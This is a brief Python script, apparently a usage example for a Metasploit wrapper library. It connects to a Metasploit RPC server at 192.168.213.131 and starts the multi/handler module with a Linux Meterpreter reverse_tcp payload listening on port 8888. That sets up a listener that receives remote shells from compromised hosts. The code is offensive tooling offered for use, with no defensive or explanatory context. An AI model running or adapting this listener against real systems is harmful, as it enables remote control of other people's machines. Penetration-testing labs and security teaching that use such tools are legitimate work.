from zdppy_metasploit import *

msf = new_metasploit(host="192.168.213.131", port=55553)

opts = {'LHOST': '0.0.0.0', 'LPORT': 8888, 'PAYLOAD': 'linux/x86/meterpreter/reverse_tcp'}
msf.log.info(msf.call("module.execute", ['exploit', 'multi/handler', opts]))
